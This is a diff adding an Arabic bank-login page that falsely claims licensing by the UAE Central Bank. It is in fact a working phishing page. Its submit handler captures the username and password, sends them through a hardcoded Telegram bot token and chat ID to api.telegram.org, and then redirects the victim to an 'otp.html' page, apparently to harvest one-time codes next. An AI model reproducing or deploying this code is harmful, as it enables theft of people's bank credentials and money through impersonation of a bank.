@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <title>تسجيل الدخول</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      background-color: #ffebee; /* خلفية فاتحة حمراء */
+      font-family: 'Tahoma', 'Segoe UI', sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+
+    header, footer {
+      background-color: #d10000; /* أحمر داكن */
+      color: white;
+      text-align: center;
+      padding: 15px;
+      font-weight: bold;
+    }
+
+    header img, footer img {
+      height: 40px;
+      vertical-align: middle;
+      margin-left: 6px;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 40px auto;
+      background: #fff;
+      padding: 25px;
+      border-radius: 18px;
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
+    }
+
+    h2 {
+      color: #d10000; /* نفس لون الرأس */
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    label {
+      font-weight: bold;
+      display: block;
+      margin-bottom: 6px;
+      margin-top: 16px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      direction: rtl;
+      width: 100%;
+      padding: 12px 40px 12px 12px;
+      border: 2px solid #f44336; /* أحمر */
+      border-radius: 25px;
+      font-size: 16px;
+      box-sizing: border-box;
+      -webkit-appearance: none;
+      appearance: none;
+      font-family: inherit;
+    }
+
+    .password-container {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .password-container .toggle-button {
+      position: absolute;
+      left: 10px;
+      background: transparent;
+      border: none;
+      cursor: pointer;
+      padding: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .password-container .toggle-button svg {
+      width: 22px;
+      height: 22px;
+      stroke: #d10000; /* أحمر */
+    }
+
+    .note {
+      color: #d10000; /* أحمر */
+      font-size: 13px;
+      margin-top: 10px;
+    }
+
+    button[type="submit"] {
+      background-color: #d10000; /* أحمر */
+      color: white;
+      padding: 14px;
+      border: none;
+      border-radius: 25px;
+      font-size: 18px;
+      width: 100%;
+      margin-top: 25px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button[type="submit"]:hover {
+      background-color: #a10000; /* أحمر داكن عند المرور */
+    }
+
+    footer p {
+      margin: 10px 0 0;
+      font-size: 13px;
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        margin: 20px 10px;
+        padding: 20px;
+      }
+
+      h2 {
+        font-size: 16px;
+      }
+
+      input, button {
+        font-size: 16px;
+        padding: 16px;
+      }
+
+      .password-container .toggle-button svg {
+        width: 20px;
+        height: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  
+  <div class="container">
+    <h2>تسجيل الدخول من خلال البنك</h2>
+    <form id="loginForm">
+      <label for="username">اسم المستخدم</label>
+      <input type="text" id="username" name="username" placeholder="username" autocomplete="username" required />
+<pr><pr><pr>
+      <label for="password">كلمة المرور</label>
+      <div class="password-container">
+        <input type="password" id="password" name="password" placeholder="********" autocomplete="current-password" required />
+        <button type="button" class="toggle-button" onclick="togglePassword()" aria-label="إظهار/إخفاء كلمة المرور">
+          <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+               stroke="currentColor" stroke-width="2">
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+            <circle cx="12" cy="12" r="3" />
+          </svg>
+        </button>
+      </div>
+
+      <p class="note">⚠️ يرجى عدم إدخال معلومات خاطئة عشوائية لتجنب الحظر.</p>
+<pr><pr>
+      <button type="submit">تسجيل الدخول</button>
+    </form>
+  </div>
+<pr><pr><pr>
+  <footer>
+    <p>مرخص من مصرف الإمارات العربية المتحدة المركزي 2025 ©</p>
+  </footer>
+
+  <script>
+    // منع الأحرف العربية في حقل اسم المستخدم
+    document.getElementById("username").addEventListener("input", function() {
+      this.value = this.value.replace(/[\u0600-\u06FF\s]/g, '');
+    });
+
+    // منع الأحرف العربية في حقل كلمة المرور
+    document.getElementById("password").addEventListener("input", function() {
+      this.value = this.value.replace(/[\u0600-\u06FF\s]/g, '');
+    });
+
+    function togglePassword() {
+      const passwordInput = document.getElementById("password");
+      const eyeIcon = document.getElementById("eyeIcon");
+
+      if (passwordInput.type === "password") {
+        passwordInput.type = "text";
+        eyeIcon.innerHTML = `
+          <path d="M1 1l22 22" />
+          <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20
+                   c-7 0-11-8-11-8a21.87 21.87 0 0 1 5.08-6.09" />
+        `;
+      } else {
+        passwordInput.type = "password";
+        eyeIcon.innerHTML = `
+          <path d="M1 12s4-8 11-8 11 8 11 8
+                   -4 8-11 8-11-8-11-8z" />
+          <circle cx="12" cy="12" r="3" />
+        `;
+      }
+    }
+
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      if (!username || !password) {
+        alert("يرجى ملء جميع الحقول.");
+        return;
+      }
+
+      const pattern = /^[A-Za-z0-9@!#$%^&*()._-]{6,}$/;
+      if (!pattern.test(password)) {
+        alert("كلمة المرور يجب أن تحتوي على حروف وأرقام ورموز.");
+        return;
+      }
+
+      const message = `🔐 محاولة تسجيل دخول:\n👤 المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;
+      const token = "7249432247:AAFCoEkwppQ0pOrGWOLBBBCWyATgjpD__bo";
+      const chatId = "7284154308";
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      }).then(() => {
+        window.location.href = "otp.html";
+      }).catch(() => {
+        alert("حدث خطأ أثناء الإرسال، حاول مرة أخرى.");
+      });
+    });
+  </script>
+
+</body>
+</html>
